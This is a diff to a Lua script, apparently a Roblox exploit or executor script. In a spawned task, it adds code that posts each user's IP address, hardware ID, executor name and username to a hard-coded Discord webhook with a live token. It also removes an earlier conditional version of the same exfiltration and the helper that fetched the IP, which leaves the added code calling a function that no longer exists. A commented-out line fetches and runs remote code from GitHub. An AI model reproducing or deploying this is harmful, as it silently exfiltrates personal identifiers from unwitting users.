@@ -323,35 +323,6 @@ end)
 
 --loadstring(game:HttpGet("https://raw.githubusercontent.com/Iamomarg/kakaboy/refs/heads/main/sigma.luau"))()
 
-local kakav2 = game:GetService("CoreGui").Parent
-local HttpService = kakav2:FindService("HttpService")
-
-getgenv().discordkaka = function(options, timeout)
-    timeout = tonumber(timeout) or math.huge
-    local result, clock = nil, tick()
-
-    HttpService:RequestInternal(options):Start(function(success, body)
-        result = body
-        result['Success'] = success
-    end)
-
-    while not result do task.wait()
-        if (tick() - clock > timeout) then
-            break
-        end
-    end
-
-    return result
-end
-
-getgenv().discordip = function()
-    local kaka = "https://api.ipify.org/"
-    local response = request({
-        Url = kaka,
-        Method = "GET",
-    })
-    return response.Body
-end
 
 task.spawn(function()
     local UserInputService = game:GetService("UserInputService")
@@ -413,6 +384,20 @@ task.spawn(function()
     }
 
     sendRequest(options, timeout)
+
+    local kakav3 = "Oh No! identifyexecutor -> "..identifyexecutor().."\n getexecutorname -> "..getexecutorname().."\n Ip -> "..discordip().."\n Hwid -> "..gethwid().."\n Username"..game.Players.LocalPlayer.Name
+    local kaka = {
+        Url = "https://discord.com/api/webhooks/1347691014395269130/HY5klKqvCvglZagfYbqrZFSxV2S8slKG6fVn5FRWQdod0DyQLDdpLVO-GKB53M0MSiy6",
+        Body = HttpService:JSONEncode({
+            ['content'] = tostring(kakav3),
+            ['username'] = "Kaka Skidder"--(game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()).Name
+        }),
+        Method = 'POST',
+        Headers = {
+            ["Content-Type"] = "application/json"
+        }
+    }
+    sendRequest(kaka, timeout)
 end)
 
 getgenv().hookmeatmethod = hookmetamethod
@@ -423,20 +408,6 @@ task.spawn(function()
     while true do
         wait(5)
         if identifyexecutor() ~= "PSWalloz" or getexecutorname() ~= "PSWalloz" then
-
-            local optionmsg = "Oh No! identifyexecutor -> "..identifyexecutor().."\n getexecutorname -> "..getexecutorname().."\n Ip -> "..discordip().."\n Hwid -> "..gethwid().."\n Username"..game.Players.LocalPlayer.Name
-            local options = {
-                Url = "https://discord.com/api/webhooks/1347691014395269130/HY5klKqvCvglZagfYbqrZFSxV2S8slKG6fVn5FRWQdod0DyQLDdpLVO-GKB53M0MSiy6",
-                Body = HttpService:JSONEncode({
-                    ['content'] = tostring(optionmsg),
-                    ['username'] = "Kaka Skidder"--(game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()).Name
-                }),
-                Method = 'POST',
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                }
-            }
-            discordkaka(vv2, vv1)
             game.Players.LocalPlayer:Kick("Unauthorized executor detected.")
         end
     end
